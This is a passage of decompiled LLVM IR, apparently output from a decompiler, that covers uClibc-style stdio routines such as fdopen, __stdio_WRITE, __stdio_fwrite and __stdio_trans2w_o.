  %v1_10020ed8 = add i32 %v0_10020ed4.pre, 4
  store i32 %v1_10020ed8, i32* @r11, align 4
  %v2_10020edc = icmp ugt i32 %v2_10020ed4, 127
  %extract.t24 = trunc i32 %v2_10020ed4 to i8
  br i1 %v2_10020edc, label %dec_label_pc_10020e94, label %dec_label_pc_10020ee4

dec_label_pc_10020f00:                            ; preds = %dec_label_pc_10020ef4, %dec_label_pc_10020ec0, %dec_label_pc_10020ea8
  %v0_10020f04 = phi i32 [ %v0_10020f04.pre, %dec_label_pc_10020ea8 ], [ %v2_10020ee47, %dec_label_pc_10020ec0 ], [ %v2_10020ef4, %dec_label_pc_10020ef4 ]
  %v2_10020f00 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10020f00, i32* %r0.global-to-local, align 4
  %v4_10020f04 = icmp eq i32 %v0_10020f04, %v2_10020f00
  br i1 %v4_10020f04, label %dec_label_pc_10020f10, label %dec_label_pc_10020f0c

dec_label_pc_10020f0c:                            ; preds = %dec_label_pc_10020f00
  %v0_10020f0c = load i32, i32* @r11, align 4
  %v1_10020f0c = load i32, i32* @r4, align 4
  %v2_10020f0c = inttoptr i32 %v1_10020f0c to i32*
  store i32 %v0_10020f0c, i32* %v2_10020f0c, align 4
  br label %dec_label_pc_10020f10

dec_label_pc_10020f10:                            ; preds = %dec_label_pc_10020f00, %dec_label_pc_10020f0c
  %v0_10020f10 = load i32, i32* %r9.global-to-local, align 4
  %v1_10020f10 = load i32, i32* @r5, align 4
  %v2_10020f10 = sub i32 %v1_10020f10, %v0_10020f10
  store i32 %v2_10020f10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10020f14

dec_label_pc_10020f14:                            ; preds = %dec_label_pc_10020e94, %dec_label_pc_10020f10
  %v0_10020f18 = phi i32 [ %v0_10020f18.pre, %dec_label_pc_10020e94 ], [ %v2_10020f10, %dec_label_pc_10020f10 ]
  store i32 %v0_10020e60, i32* %r0.global-to-local, align 4
  ret i32 %v0_10020f18

; uselistorder directives
  uselistorder i32 %v1_10020efc, { 1, 0 }
  uselistorder i32 %v2_10020ef4, { 0, 2, 1 }
  uselistorder i32 %v1_10020ee8, { 1, 0 }
  uselistorder i32 %v0_10020ecc, { 2, 3, 0, 1 }
  uselistorder i32 %v2_10020ee47, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10020f14, { 1, 0 }
  uselistorder label %dec_label_pc_10020f10, { 1, 0 }
  uselistorder label %dec_label_pc_10020ee4, { 1, 0 }
  uselistorder label %dec_label_pc_10020ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10020eb4, { 2, 0, 1 }
}

define i32 @fdopen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_10020f2c = load i32, i32* @lr, align 4
  store i32 268570444, i32* @lr, align 4
  %v2_10020f48 = call i32 @__libc_fcntl(i32 3, i32 3)
  %v3_10020f4c = icmp eq i32 %v2_10020f48, -1
  store i32 %arg1, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br i1 %v3_10020f4c, label %dec_label_pc_10020f74, label %dec_label_pc_10020f60

dec_label_pc_10020f60:                            ; preds = %entry
  store i32 %v0_10020f2c, i32* @lr, align 4
  %v4_10020f70 = inttoptr i32 %arg2 to i8*
  %v5_10020f70 = call i32 @_stdio_fopen(i32 %v2_10020f48, i8* %v4_10020f70)
  br label %dec_label_pc_10020f74

dec_label_pc_10020f74:                            ; preds = %entry, %dec_label_pc_10020f60
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10020f74, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10020f8c = load i32, i32* @lr, align 4
  store i32 %v0_10020f8c, i32* %r0.global-to-local, align 4
  %v0_10020f98 = load i32, i32* @r5, align 4
  store i32 %v0_10020f98, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10020f98, i32* @r31, align 4
  %v3_10020fac3 = icmp eq i32 %v0_10020f98, 0
  store i32 %v0_10020f98, i32* @r27, align 4
  br i1 %v3_10020fac3, label %dec_label_pc_10021054, label %dec_label_pc_10020fbc

dec_label_pc_10020fbc:                            ; preds = %entry, %dec_label_pc_10020fdc
  %v0_10020fcc = phi i32 [ %v2_10020fdc, %dec_label_pc_10020fdc ], [ %arg2, %entry ]
  %v1_10020fbc.in = phi i32 [ %v2_10020fe0, %dec_label_pc_10020fdc ], [ %v0_10020f98, %entry ]
  %v1_10020fbc = icmp sgt i32 %v1_10020fbc.in, 0
  br i1 %v1_10020fbc, label %dec_label_pc_10020fc8, label %dec_label_pc_10020fc0

dec_label_pc_10020fc0:                            ; preds = %dec_label_pc_10020fbc
  br label %dec_label_pc_10020fc8

dec_label_pc_10020fc8:                            ; preds = %dec_label_pc_10020fbc, %dec_label_pc_10020fc0
  %v0_10020fc8 = load i32, i32* @r30, align 4
  %v1_10020fc8 = add i32 %v0_10020fc8, 4
  %v2_10020fc8 = inttoptr i32 %v1_10020fc8 to i32*
  %v3_10020fc8 = load i32, i32* %v2_10020fc8, align 4
  store i32 268570580, i32* @lr, align 4
  %v3_10020fd0 = call i32 @__libc_write(i32 %v3_10020fc8, i32 %v0_10020fcc)
  %v1_10020fd4 = icmp slt i32 %v3_10020fd0, 0
  br i1 %v1_10020fd4, label %dec_label_pc_10020fe8, label %dec_label_pc_10020fdc

dec_label_pc_10020fdc:                            ; preds = %dec_label_pc_10020fc8
  %v0_10020fdc = load i32, i32* @r29, align 4
  %v2_10020fdc = add i32 %v0_10020fdc, %v3_10020fd0
  store i32 %v2_10020fdc, i32* @r29, align 4
  %v1_10020fe0 = load i32, i32* @r31, align 4
  %v2_10020fe0 = sub i32 %v1_10020fe0, %v3_10020fd0
  store i32 %v2_10020fe0, i32* @r31, align 4
  %v3_10020fac = icmp eq i32 %v2_10020fe0, 0
  store i32 %v2_10020fe0, i32* @r27, align 4
  br i1 %v3_10020fac, label %dec_label_pc_10020fac.dec_label_pc_10021054.loopexit_crit_edge, label %dec_label_pc_10020fbc

dec_label_pc_10020fe8:                            ; preds = %dec_label_pc_10020fc8
  %v0_10020fe8 = load i32, i32* @r30, align 4
  %v1_10020fe8 = add i32 %v0_10020fe8, 8
  %v2_10020fe8 = inttoptr i32 %v1_10020fe8 to i32*
  %v3_10020fe8 = load i32, i32* %v2_10020fe8, align 4
  store i32 %v3_10020fe8, i32* @r11, align 4
  %v1_10020fec = add i32 %v0_10020fe8, 12
  %v2_10020fec = inttoptr i32 %v1_10020fec to i32*
  %v3_10020fec = load i32, i32* %v2_10020fec, align 4
  store i32 %v3_10020fec, i32* %r0.global-to-local, align 4
  %v1_10020ff0 = inttoptr i32 %v0_10020fe8 to i16*
  %v2_10020ff0 = load i16, i16* %v1_10020ff0, align 2
  %v2_10020ff4 = sub i32 %v3_10020fec, %v3_10020fe8
  store i32 %v2_10020ff4, i32* %r0.global-to-local, align 4
  %v5_10020ff4 = icmp eq i32 %v2_10020ff4, 0
  %v1_10020ff8 = or i16 %v2_10020ff0, 8
  store i16 %v1_10020ff8, i16* %v1_10020ff0, align 2
  br i1 %v5_10020ff4, label %dec_label_pc_10020fe8.dec_label_pc_10021050_crit_edge, label %dec_label_pc_10021004

dec_label_pc_10020fe8.dec_label_pc_10021050_crit_edge: ; preds = %dec_label_pc_10020fe8
  %v0_10021050.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021050

dec_label_pc_10021004:                            ; preds = %dec_label_pc_10020fe8
  %v0_10021004 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021004 = load i32, i32* @r31, align 4
  %v3_10021004 = icmp ugt i32 %v0_10021004, %v1_10021004
  br i1 %v3_10021004, label %dec_label_pc_10021004.dec_label_pc_10021010_crit_edge, label %dec_label_pc_1002100c

dec_label_pc_10021004.dec_label_pc_10021010_crit_edge: ; preds = %dec_label_pc_10021004
  %v0_10021010.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10021010

dec_label_pc_1002100c:                            ; preds = %dec_label_pc_10021004
  store i32 %v0_10021004, i32* @r27, align 4
  br label %dec_label_pc_10021010

dec_label_pc_10021010:                            ; preds = %dec_label_pc_10021004.dec_label_pc_10021010_crit_edge, %dec_label_pc_1002100c
  %v0_10021010 = phi i32 [ %v0_10021010.pre, %dec_label_pc_10021004.dec_label_pc_10021010_crit_edge ], [ %v0_10021004, %dec_label_pc_1002100c ]
  store i32 %v0_10021010, i32* %ctr.global-to-local, align 4
  %v2_1002101c.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10021014

dec_label_pc_10021014:                            ; preds = %dec_label_pc_10021038, %dec_label_pc_10021010
  %v2_1002101c = phi i32 [ %v1_10021038, %dec_label_pc_10021038 ], [ %v2_1002101c.pre, %dec_label_pc_10021010 ]
  %v0_10021014 = load i32, i32* @r29, align 4
  %v1_10021014 = inttoptr i32 %v0_10021014 to i8*
  %v2_10021014 = load i8, i8* %v1_10021014, align 1
  %v3_10021014 = zext i8 %v2_10021014 to i32
  store i32 %v3_10021014, i32* %r0.global-to-local, align 4
  %v1_10021018 = add i32 %v0_10021014, 1
  store i32 %v1_10021018, i32* @r29, align 4
  %v3_1002101c = inttoptr i32 %v2_1002101c to i8*
  store i8 %v2_10021014, i8* %v3_1002101c, align 1
  %v0_10021020 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021020 = urem i32 %v0_10021020, 256
  store i32 %v1_10021020, i32* %r0.global-to-local, align 4
  %v3_10021024 = icmp eq i32 %v1_10021020, 10
  br i1 %v3_10021024, label %dec_label_pc_1002102c, label %dec_label_pc_10021038

dec_label_pc_1002102c:                            ; preds = %dec_label_pc_10021014
  %v0_1002102c = load i32, i32* @r30, align 4
  %v1_1002102c = inttoptr i32 %v0_1002102c to i16*
  %v2_1002102c = load i16, i16* %v1_1002102c, align 2
  %v3_1002102c = zext i16 %v2_1002102c to i32
  store i32 %v3_1002102c, i32* %r0.global-to-local, align 4
  %v1_10021030 = and i32 %v3_1002102c, 256
  %v3_10021030 = icmp eq i32 %v1_10021030, 0
  br i1 %v3_10021030, label %dec_label_pc_10021038, label %dec_label_pc_1002102c.dec_label_pc_10021040_crit_edge

dec_label_pc_1002102c.dec_label_pc_10021040_crit_edge: ; preds = %dec_label_pc_1002102c
  %v0_10021044.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10021040

dec_label_pc_10021038:                            ; preds = %dec_label_pc_1002102c, %dec_label_pc_10021014
  %v0_10021038 = load i32, i32* @r11, align 4
  %v1_10021038 = add i32 %v0_10021038, 1
  store i32 %v1_10021038, i32* @r11, align 4
  %v0_1002103c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1002103c = add i32 %v0_1002103c, -1
  store i32 %v1_1002103c, i32* %ctr.global-to-local, align 4
  %v2_1002103c = icmp eq i32 %v1_1002103c, 0
  br i1 %v2_1002103c, label %dec_label_pc_10021038.dec_label_pc_10021040_crit_edge, label %dec_label_pc_10021014

dec_label_pc_10021038.dec_label_pc_10021040_crit_edge: ; preds = %dec_label_pc_10021038
  %v0_10021040.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10021040

dec_label_pc_10021040:                            ; preds = %dec_label_pc_1002102c.dec_label_pc_10021040_crit_edge, %dec_label_pc_10021038.dec_label_pc_10021040_crit_edge
  %v0_10021044 = phi i32 [ %v1_10021038, %dec_label_pc_10021038.dec_label_pc_10021040_crit_edge ], [ %v0_10021044.pre, %dec_label_pc_1002102c.dec_label_pc_10021040_crit_edge ]
  %v0_10021040 = phi i32 [ %v0_10021040.pre, %dec_label_pc_10021038.dec_label_pc_10021040_crit_edge ], [ %v0_1002102c, %dec_label_pc_1002102c.dec_label_pc_10021040_crit_edge ]
  %v1_10021040 = add i32 %v0_10021040, 8
  %v2_10021040 = inttoptr i32 %v1_10021040 to i32*
  %v3_10021040 = load i32, i32* %v2_10021040, align 4
  store i32 %v3_10021040, i32* %r0.global-to-local, align 4
  %v2_10021044 = add i32 %v0_10021040, 16
  %v3_10021044 = inttoptr i32 %v2_10021044 to i32*
  store i32 %v0_10021044, i32* %v3_10021044, align 4
  %v0_10021048 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021048 = load i32, i32* @r11, align 4
  %v2_10021048 = sub i32 %v1_10021048, %v0_10021048
  store i32 %v2_10021048, i32* %r0.global-to-local, align 4
  %v1_1002104c = load i32, i32* @r31, align 4
  %v2_1002104c = sub i32 %v1_1002104c, %v2_10021048
  store i32 %v2_1002104c, i32* @r31, align 4
  br label %dec_label_pc_10021050

dec_label_pc_10021050:                            ; preds = %dec_label_pc_10020fe8.dec_label_pc_10021050_crit_edge, %dec_label_pc_10021040
  %v0_10021050 = phi i32 [ %v0_10021050.pre, %dec_label_pc_10020fe8.dec_label_pc_10021050_crit_edge ], [ %v2_1002104c, %dec_label_pc_10021040 ]
  %v1_10021050 = load i32, i32* @r28, align 4
  %v2_10021050 = sub i32 %v1_10021050, %v0_10021050
  store i32 %v2_10021050, i32* @r28, align 4
  br label %dec_label_pc_10021054

dec_label_pc_10020fac.dec_label_pc_10021054.loopexit_crit_edge: ; preds = %dec_label_pc_10020fdc
  %v0_10021058.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10021054

dec_label_pc_10021054:                            ; preds = %entry, %dec_label_pc_10020fac.dec_label_pc_10021054.loopexit_crit_edge, %dec_label_pc_10021050
  %v0_10021058 = phi i32 [ %v2_10021050, %dec_label_pc_10021050 ], [ %v0_10021058.pre.pre, %dec_label_pc_10020fac.dec_label_pc_10021054.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_10020f8c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10021058

; uselistorder directives
  uselistorder i32 %v0_10021040, { 1, 0 }
  uselistorder i32 %v1_1002103c, { 1, 0 }
  uselistorder i32 %v1_10021038, { 0, 2, 1 }
  uselistorder i32 %v1_10021020, { 1, 0 }
  uselistorder i32 %v2_10020fe0, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10020fdc, { 1, 0 }
  uselistorder i32 %v3_10020fd0, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__libc_write, { 6, 15, 14, 13, 16, 12, 11, 0, 5, 1, 4, 2, 9, 8, 10, 3, 7 }
  uselistorder label %dec_label_pc_10021054, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10021050, { 1, 0 }
  uselistorder label %dec_label_pc_10021040, { 1, 0 }
  uselistorder label %dec_label_pc_10021010, { 1, 0 }
  uselistorder label %dec_label_pc_10020fc8, { 1, 0 }
  uselistorder label %dec_label_pc_10020fbc, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_1002106c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_10021088 = load i16, i16* %arg3, align 2
  %v1_1002108c = and i16 %v3_10021088, 512
  %v3_1002108c = icmp eq i16 %v1_1002108c, 0
  br i1 %v3_1002108c, label %dec_label_pc_10021094, label %dec_label_pc_100211a0

dec_label_pc_10021094:                            ; preds = %entry
  %v2_10021094 = add i32 %tmp, 4
  %v3_10021094 = inttoptr i32 %v2_10021094 to i32*
  %v4_10021094 = load i32, i32* %v3_10021094, align 4
  %v2_10021098 = add i32 %tmp, 16
  %v3_10021098 = inttoptr i32 %v2_10021098 to i32*
  %v4_10021098 = load i32, i32* %v3_10021098, align 4
  store i32 %v4_10021098, i32* @r3, align 4
  %v3_1002109c = icmp eq i32 %v4_10021094, -2
  %v2_100210a0 = add i32 %tmp, 12
  %v3_100210a0 = inttoptr i32 %v2_100210a0 to i32*
  %v4_100210a0 = load i32, i32* %v3_100210a0, align 4
  %v2_100210a8 = sub i32 %v4_100210a0, %v4_10021098
  br i1 %v3_1002109c, label %dec_label_pc_100210a8, label %dec_label_pc_100210d8

dec_label_pc_100210a8:                            ; preds = %dec_label_pc_10021094
  %v3_100210b0 = icmp ult i32 %v2_100210a8, %arg2
  br i1 %v3_100210b0, label %dec_label_pc_100210b8, label %dec_label_pc_100210bc

dec_label_pc_100210b8:                            ; preds = %dec_label_pc_100210a8
  br label %dec_label_pc_100210bc

dec_label_pc_100210bc:                            ; preds = %dec_label_pc_100210a8, %dec_label_pc_100210b8
  %storemerge = phi i32 [ %v2_100210a8, %dec_label_pc_100210b8 ], [ %arg2, %dec_label_pc_100210a8 ]
  %v0_100210c0 = phi i32 [ %v2_100210a8, %dec_label_pc_100210b8 ], [ %arg2, %dec_label_pc_100210a8 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_100210c0, i32* @r5, align 4
  store i32 268570824, i32* @lr, align 4
  %v0_100210c4 = call i32 @memcpy()
  %v0_100210c8 = load i32, i32* @r30, align 4
  %v1_100210c8 = add i32 %v0_100210c8, 16
  %v2_100210c8 = inttoptr i32 %v1_100210c8 to i32*
  %v3_100210c8 = load i32, i32* %v2_100210c8, align 4
  %v1_100210cc = load i32, i32* @r31, align 4
  %v2_100210cc = add i32 %v1_100210cc, %v3_100210c8
  store i32 %v2_100210cc, i32* %v2_100210c8, align 4
  br label %dec_label_pc_100211c0

dec_label_pc_100210d8:                            ; preds = %dec_label_pc_10021094
  %v3_100210dc = icmp ult i32 %v2_100210a8, %arg2
  br i1 %v3_100210dc, label %dec_label_pc_1002117c, label %dec_label_pc_100210e4

dec_label_pc_100210e4:                            ; preds = %dec_label_pc_100210d8
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268570864, i32* @lr, align 4
  %v0_100210ec = call i32 @memcpy()
  %v0_100210f0 = load i32, i32* @r30, align 4
  %v1_100210f0 = inttoptr i32 %v0_100210f0 to i16*
  %v2_100210f0 = load i16, i16* %v1_100210f0, align 2
  %v3_100210f0 = zext i16 %v2_100210f0 to i32
  %v1_100210f4 = add i32 %v0_100210f0, 16
  %v2_100210f4 = inttoptr i32 %v1_100210f4 to i32*
  %v3_100210f4 = load i32, i32* %v2_100210f4, align 4
  %v1_100210f8 = and i32 %v3_100210f0, 256
  store i32 %v1_100210f8, i32* @r11, align 4
  %v3_100210f8 = icmp eq i32 %v1_100210f8, 0
  %v1_100210fc = load i32, i32* @r29, align 4
  %v2_100210fc = add i32 %v1_100210fc, %v3_100210f4
  store i32 %v2_100210fc, i32* %v2_100210f4, align 4
  br i1 %v3_100210f8, label %dec_label_pc_100211c0, label %dec_label_pc_10021108

dec_label_pc_10021108:                            ; preds = %dec_label_pc_100210e4
  %v0_10021108 = load i32, i32* @r28, align 4
  %v0_10021110 = load i32, i32* @r29, align 4
  store i32 268570904, i32* @lr, align 4
  %v4_10021114 = call i32 @memrchr(i32 %v0_10021108, i32 10, i32 %v0_10021110, i32 %v2_100210fc)
  %v3_10021118 = icmp eq i32 %v4_10021114, 0
  br i1 %v3_10021118, label %dec_label_pc_100211c0, label %dec_label_pc_10021120

dec_label_pc_10021120:                            ; preds = %dec_label_pc_10021108
  %v0_10021120 = load i32, i32* @r30, align 4
  store i32 %v0_10021120, i32* @r3, align 4
  store i32 268570920, i32* @lr, align 4
  %v0_10021124 = call i32 @__stdio_wcommit()
  %v3_10021128 = icmp eq i32 %v0_10021124, 0
  br i1 %v3_10021128, label %dec_label_pc_100211c0, label %dec_label_pc_10021130

dec_label_pc_10021130:                            ; preds = %dec_label_pc_10021120
  %v0_10021130 = load i32, i32* @r29, align 4
  %v3_10021130 = icmp ugt i32 %v0_10021130, %v0_10021124
  %v0_10021124.v0_10021134 = select i1 %v3_10021130, i32 %v0_10021124, i32 %v0_10021130
  store i32 %v0_10021124.v0_10021134, i32* @r31, align 4
  %v2_10021140 = sub i32 %v0_10021130, %v0_10021124.v0_10021134
  %v0_10021148 = load i32, i32* @r28, align 4
  %v2_10021148 = add i32 %v0_10021148, %v2_10021140
  store i32 %v2_10021148, i32* @r28, align 4
  store i32 %v2_10021148, i32* @r3, align 4
  store i32 268570968, i32* @lr, align 4
  %v3_10021154 = call i32 @__GI_memchr(i32 %v2_10021148, i32 10, i32 %v0_10021124.v0_10021134)
  %v3_10021158 = icmp eq i32 %v3_10021154, 0
  br i1 %v3_10021158, label %dec_label_pc_100211c0, label %dec_label_pc_10021160

dec_label_pc_10021160:                            ; preds = %dec_label_pc_10021130
  %v0_10021160 = load i32, i32* @r30, align 4
  %v1_10021160 = add i32 %v0_10021160, 16
  %v2_10021160 = inttoptr i32 %v1_10021160 to i32*
  %v3_10021160 = load i32, i32* %v2_10021160, align 4
  %v0_10021164 = load i32, i32* @r28, align 4
  %v1_10021164 = load i32, i32* @r31, align 4
  %v2_10021164 = sub i32 %v0_10021164, %v3_10021154
  %v2_10021168 = add i32 %v2_10021164, %v1_10021164
  %v2_1002116c = sub i32 %v3_10021160, %v2_10021168
  %v1_10021170 = load i32, i32* @r29, align 4
  %v2_10021170 = sub i32 %v1_10021170, %v2_10021168
  store i32 %v2_10021170, i32* @r29, align 4
  store i32 %v2_1002116c, i32* %v2_10021160, align 4
  br label %dec_label_pc_100211c0

dec_label_pc_1002117c:                            ; preds = %dec_label_pc_100210d8
  %v2_1002117c = add i32 %tmp, 8
  %v3_1002117c = inttoptr i32 %v2_1002117c to i32*
  %v4_1002117c = load i32, i32* %v3_1002117c, align 4
  %v4_10021180 = icmp eq i32 %v4_10021098, %v4_1002117c
  br i1 %v4_10021180, label %dec_label_pc_100211a0, label %dec_label_pc_10021188

dec_label_pc_10021188:                            ; preds = %dec_label_pc_1002117c
  store i32 %tmp, i32* @r3, align 4
  store i32 268571024, i32* @lr, align 4
  %v0_1002118c = call i32 @__stdio_wcommit()
  %v3_10021190 = icmp eq i32 %v0_1002118c, 0
  br i1 %v3_10021190, label %dec_label_pc_10021188.dec_label_pc_100211a0_crit_edge, label %dec_label_pc_10021198

dec_label_pc_10021188.dec_label_pc_100211a0_crit_edge: ; preds = %dec_label_pc_10021188
  %v0_100211a4.pre = load i32, i32* @r30, align 4
  %v0_100211a8.pre = load i32, i32* @r28, align 4
  %v0_100211ac.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100211a0

dec_label_pc_10021198:                            ; preds = %dec_label_pc_10021188
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_100211c0

dec_label_pc_100211a0:                            ; preds = %dec_label_pc_10021188.dec_label_pc_100211a0_crit_edge, %entry, %dec_label_pc_1002117c
  %v0_100211ac = phi i32 [ %v0_100211ac.pre, %dec_label_pc_10021188.dec_label_pc_100211a0_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1002117c ]
  %v0_100211a8 = phi i32 [ %v0_100211a8.pre, %dec_label_pc_10021188.dec_label_pc_100211a0_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1002117c ]
  %v0_100211a4 = phi i32 [ %v0_100211a4.pre, %dec_label_pc_10021188.dec_label_pc_100211a0_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1002117c ]
  %v1_100211a4 = inttoptr i32 %v0_100211a4 to i16*
  store i32 %v0_100211ac, i32* @r5, align 4
  store i32 %v0_1002106c, i32* @lr, align 4
  %v5_100211bc = call i32 @__stdio_WRITE(i16* %v1_100211a4, i32 %v0_100211a8)
  br label %dec_label_pc_100211c0

dec_label_pc_100211c0:                            ; preds = %dec_label_pc_10021130, %dec_label_pc_10021120, %dec_label_pc_10021108, %dec_label_pc_100210e4, %dec_label_pc_10021198, %dec_label_pc_10021160, %dec_label_pc_100210bc, %dec_label_pc_100211a0
  %v0_100211c4 = load i32, i32* @r29, align 4
  ret i32 %v0_100211c4

; uselistorder directives
  uselistorder i32 %v2_10021168, { 1, 0 }
  uselistorder i32 %v0_10021124.v0_10021134, { 0, 2, 1 }
  uselistorder i32 %v0_10021130, { 1, 0, 2 }
  uselistorder i32 %v2_100210a8, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_100211c0, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_100211a0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100210bc, { 1, 0 }
}

define i32 @__stdio_trans2w_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_100211d8 = load i32, i32* @lr, align 4
  store i32 %v0_100211d8, i32* %r0.global-to-local, align 4
  %v0_100211e0 = load i32, i32* @r31, align 4
  %v0_100211e4 = load i32, i32* @r3, align 4
  store i32 %v0_100211e4, i32* @r31, align 4
  %v1_100211ec = inttoptr i32 %v0_100211e4 to i16*
  %v2_100211ec = load i16, i16* %v1_100211ec, align 2
  %v3_100211ec = zext i16 %v2_100211ec to i32
  store i32 %v3_100211ec, i32* %r0.global-to-local, align 4
  %v1_100211f0 = load i32, i32* @r4, align 4
  %v2_100211f0 = and i32 %v1_100211f0, %v3_100211ec
  store i32 %v2_100211f0, i32* %r9.global-to-local, align 4
  %v5_100211f0 = icmp eq i32 %v2_100211f0, 0
  br i1 %v5_100211f0, label %dec_label_pc_100211f8, label %dec_label_pc_10021208

dec_label_pc_100211f8:                            ; preds = %entry
  %v1_100211f8 = and i32 %v3_100211ec, 2176
  store i32 %v1_100211f8, i32* %r9.global-to-local, align 4
  %v3_100211f8 = icmp eq i32 %v1_100211f8, 0
  br i1 %v3_100211f8, label %dec_label_pc_10021200, label %dec_label_pc_10021214

dec_label_pc_10021200:                            ; preds = %dec_label_pc_100211f8
  %v2_10021200 = or i32 %v1_100211f0, %v3_100211ec
  store i32 %v2_10021200, i32* %r0.global-to-local, align 4
  %v1_10021204 = trunc i32 %v2_10021200 to i16
  store i16 %v1_10021204, i16* %v1_100211ec, align 2
  %v0_10021208.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021208

dec_label_pc_10021208:                            ; preds = %entry, %dec_label_pc_10021200
  %v0_10021244 = phi i32 [ %v0_100211e4, %entry ], [ %v0_10021208.pre, %dec_label_pc_10021200 ]
  %v1_10021208 = inttoptr i32 %v0_10021244 to i16*
  %v2_10021208 = load i16, i16* %v1_10021208, align 2
  %v3_10021208 = zext i16 %v2_10021208 to i32
  store i32 %v3_10021208, i32* @r11, align 4
  %v1_1002120c = and i32 %v3_10021208, 32
  store i32 %v1_1002120c, i32* %r0.global-to-local, align 4
  %v3_1002120c = icmp eq i32 %v1_1002120c, 0
  br i1 %v3_1002120c, label %dec_label_pc_10021234, label %dec_label_pc_10021214

dec_label_pc_10021214:                            ; preds = %dec_label_pc_100211f8, %dec_label_pc_10021208
  %v0_10021214 = call i32 @__errno_location()
  store i32 %v0_10021214, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_1002121c = inttoptr i32 %v0_10021214 to i32*
  store i32 9, i32* %v2_1002121c, align 4
  br label %dec_label_pc_10021220

dec_label_pc_10021220:                            ; preds = %dec_label_pc_1002125c, %dec_label_pc_10021214
  %v0_10021220 = load i32, i32* @r31, align 4
  %v1_10021220 = inttoptr i32 %v0_10021220 to i16*
  %v2_10021220 = load i16, i16* %v1_10021220, align 2
  %v3_10021220 = zext i16 %v2_10021220 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10021228 = or i32 %v3_10021220, 8
  store i32 %v1_10021228, i32* %r0.global-to-local, align 4
  %v1_1002122c = trunc i32 %v1_10021228 to i16
  store i16 %v1_1002122c, i16* %v1_10021220, align 2
  br label %dec_label_pc_100212bc

dec_label_pc_10021234:                            ; preds = %dec_label_pc_10021208
  %tmp = urem i16 %v2_10021208, 4
  %v1_10021234 = zext i16 %tmp to i32
  store i32 %v1_10021234, i32* %r0.global-to-local, align 4
  %v3_10021234 = icmp eq i16 %tmp, 0
  br i1 %v3_10021234, label %dec_label_pc_10021298, label %dec_label_pc_1002123c

dec_label_pc_1002123c:                            ; preds = %dec_label_pc_10021234
  %v1_1002123c = and i32 %v3_10021208, 4
  store i32 %v1_1002123c, i32* %r9.global-to-local, align 4
  %v3_1002123c = icmp eq i32 %v1_1002123c, 0
  br i1 %v3_1002123c, label %dec_label_pc_10021244, label %dec_label_pc_1002127c

dec_label_pc_10021244:                            ; preds = %dec_label_pc_1002123c
  %v1_10021244 = add i32 %v0_10021244, 20
  %v2_10021244 = inttoptr i32 %v1_10021244 to i32*
  %v3_10021244 = load i32, i32* %v2_10021244, align 4
  store i32 %v3_10021244, i32* %r0.global-to-local, align 4
  %v1_10021248 = add i32 %v0_10021244, 16
  %v2_10021248 = inttoptr i32 %v1_10021248 to i32*
  %v3_10021248 = load i32, i32* %v2_10021248, align 4
  store i32 %v3_10021248, i32* %r9.global-to-local, align 4
  %v4_1002124c = icmp eq i32 %v3_10021244, %v3_10021248
  br i1 %v4_1002124c, label %dec_label_pc_10021254, label %dec_label_pc_1002125c

